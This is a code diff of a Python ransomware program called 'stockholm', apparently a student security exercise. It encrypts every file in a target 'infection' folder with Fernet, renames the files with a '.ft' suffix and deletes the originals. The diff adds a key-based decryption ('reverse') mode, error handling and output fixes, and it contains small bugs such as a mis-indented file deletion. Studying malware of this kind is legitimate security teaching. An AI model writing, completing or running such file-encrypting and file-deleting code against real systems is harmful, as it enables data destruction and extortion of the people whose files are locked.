@@ -3,7 +3,7 @@ import sys
 import secrets
 import logging
 import os.path
-from cryptography.fernet import Fernet
+from cryptography.fernet import Fernet, InvalidToken
 
 PATH_FILE_KEY="./.key"
 # PATH_INFECTION_FOLDER="/home/infection/"
@@ -14,22 +14,54 @@ silent_output = False
 
 def	parse_args():
 	parser = argparse.ArgumentParser()
-	group = parser.add_mutually_exclusive_group(required=False)
-	group.add_argument("-v", "--version", action="store_true", dest="version",
+	parser.add_argument("-v", "--version", action="store_true", dest="version",
 					help="Show the version of the program")
-	group.add_argument("-s", "--silent", action="store_true", dest="silent",
+	parser.add_argument("-s", "--silent", action="store_true", dest="silent",
 					help="Silent the terminal output of the program")
-	group.add_argument("-r", "--reverse", dest="reverse", nargs=1, metavar="KEY",
+	parser.add_argument("-r", "--reverse", type=str, dest="key", nargs=1, metavar="KEY",
 					help="Reverse the malware infection using encryption key")
 	args = parser.parse_args()
 	return args
 
 def	print_version():
 	print("stockholm version 1.0")
+
 #-------------------------------------------------------------------------------------------------#
 
-def	reverse_stockholm():
-	return 0
+def	decrypt_files(key):
+	try:
+		fernet = Fernet(key)
+	except Exception as e:
+		print(f"An error occurred while using the encryption key: {e}")
+		exit(1)
+	file_extension_list = [".ft"]
+
+	for filename in os.listdir(PATH_INFECTION_FOLDER):
+		filename = PATH_INFECTION_FOLDER + filename
+		if (not check_file_extension(filename, file_extension_list)):
+			continue
+
+		# decrypt data
+		with open(filename, 'rb') as file:
+			crypted_content = file.read()
+		try:
+			clear_content = fernet.decrypt(crypted_content)
+		except InvalidToken:
+			logging.error("Invalid key, unable to decrypt.")
+			exit(1)
+
+		# save clear content
+		with open(filename[:-len(".ft")], 'wb') as clear_file:
+			clear_file.write(clear_content)
+
+		#delete crypted file
+			os.remove(filename)
+		
+		if (not silent_output):
+			print("Decrypted file:", filename)
+
+def	reverse_stockholm(key):
+	decrypt_files(key)
 
 #-------------------------------------------------------------------------------------------------#
 		
@@ -68,7 +100,11 @@ def	init_file_extension_list():
 	return extensions
 
 def	encrypt_files(key):
-	fernet = Fernet(key)
+	try:
+		fernet = Fernet(key)
+	except Exception as e:
+		print(f"An error occurred while using the encryption key: {e}")
+		exit(1)
 	file_extension_list = init_file_extension_list()
 
 	for filename in os.listdir(PATH_INFECTION_FOLDER):
@@ -79,7 +115,11 @@ def	encrypt_files(key):
 		# encrypt data
 		with open(filename, 'rb') as file:
 			original_content = file.read()
-		encrypted_content = fernet.encrypt(original_content)
+		try:
+			encrypted_content = fernet.encrypt(original_content)
+		except InvalidToken:
+			logging.error("Invalid key, unable to encrypt.")
+			exit(1)
 
 		# save encrypted data in .ft file
 		with open(filename + ".ft", 'wb') as encrypted_file:
@@ -88,7 +128,7 @@ def	encrypt_files(key):
 		# delete clear file
 		os.remove(filename)
 
-		if (silent_output):
+		if (not silent_output):
 			print("Encrypted file:", filename)
 
 def	stockholm():
@@ -100,16 +140,16 @@ def	stockholm():
 def	main():
 	try:
 		args = parse_args()
+		global silent_output
 		silent_output = args.silent
 		if (args.version):
 			print_version()
-		elif (args.reverse):
-			reverse_stockholm()
+		elif (args.key):
+			reverse_stockholm(args.key[0])
 		else:
 			stockholm()
-
 	except Exception as e:
-		logging.error("An error occurred.", exc_info=True)	
+		logging.error("An error occurred. Here is the exception log:\n", exc_info=True)	
 		sys.exit(2)
 	return 0
 
